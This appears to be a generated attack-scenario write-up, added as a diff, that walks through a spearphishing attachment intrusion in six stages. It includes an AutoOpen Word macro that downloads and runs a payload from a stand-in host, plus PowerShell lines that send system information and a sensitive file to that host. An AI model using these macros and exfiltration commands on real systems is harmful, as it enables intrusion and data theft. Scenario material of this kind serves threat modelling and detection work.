@@ -1,0 +1,72 @@
+<output>
+Pattern Name: Spearphishing Attachment
+
+Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a victim's system. The attack progresses through multiple stages, involving email clients, web browsers, and office applications, ultimately leading to the execution of a payload that allows the attacker to exfiltrate sensitive data.
+
+Attack Flow Breakdown:
+
+**Stage 1: Initial Access via Spearphishing Email**
+- **Application Involved**: Outlook
+- **User Action**: The victim receives a spearphishing email that appears to be from a trusted source, containing a malicious attachment (e.g., a Word document).
+- **Key Artifacts**: Email headers, attachment file (e.g., `invoice.docx`).
+- **Command**: 
+  ```powershell
+  # The victim opens the email and downloads the attachment
+  Start-Process "C:\Users\Victim\Downloads\invoice.docx"
+  ```
+
+**Stage 2: Exploit Execution**
+- **Application Involved**: Microsoft Word
+- **User Action**: The victim opens the malicious Word document, which contains a macro designed to download and execute a payload.
+- **Key Artifacts**: Macro code embedded in the document, temporary files created during execution.
+- **Command**: 
+  ```vba
+  ' Macro code in Word that executes a PowerShell command to download a payload
+  Sub AutoOpen()
+      Dim objShell As Object
+      Set objShell = CreateObject("WScript.Shell")
+      objShell.Run "powershell -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\Users\Victim\AppData\Local\Temp\payload.exe' && Start-Process 'C:\Users\Victim\AppData\Local\Temp\payload.exe'"""
+  End Sub
+  ```
+
+**Stage 3: Payload Execution**
+- **Application Involved**: PowerShell
+- **User Action**: The macro executes, downloading and running the payload.
+- **Key Artifacts**: Executable file (`payload.exe`), PowerShell command history.
+- **Command**: 
+  ```powershell
+  # The payload is executed, potentially establishing a reverse shell
+  Start-Process "C:\Users\Victim\AppData\Local\Temp\payload.exe"
+  ```
+
+**Stage 4: Command and Control Communication**
+- **Application Involved**: PowerShell
+- **User Action**: The payload initiates communication with the attacker's command and control (C2) server.
+- **Key Artifacts**: Network traffic logs, C2 server IP address (e.g., `malicious.com`).
+- **Command**: 
+  ```powershell
+  # The payload sends system information back to the C2 server
+  Invoke-WebRequest -Uri "http://malicious.com/c2" -Method POST -Body "system_info=...&user=Victim"
+  ```
+
+**Stage 5: Data Exfiltration**
+- **Application Involved**: PowerShell
+- **User Action**: The attacker uses the established connection to exfiltrate sensitive data from the victim's system.
+- **Key Artifacts**: Exfiltrated files, logs of data sent to the C2 server.
+- **Command**: 
+  ```powershell
+  # The attacker exfiltrates sensitive files
+  Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method POST -InFile "C:\Users\Victim\Documents\sensitive_data.txt"
+  ```
+
+**Stage 6: Cleanup and Persistence**
+- **Application Involved**: PowerShell
+- **User Action**: The attacker may attempt to cover their tracks by deleting logs or creating persistence mechanisms.
+- **Key Artifacts**: Deleted files, scheduled tasks for persistence.
+- **Command**: 
+  ```powershell
+  # The attacker deletes the downloaded payload to avoid detection
+  Remove-Item "C:\Users\Victim\AppData\Local\Temp\payload.exe"
+  ```
+
+</output>
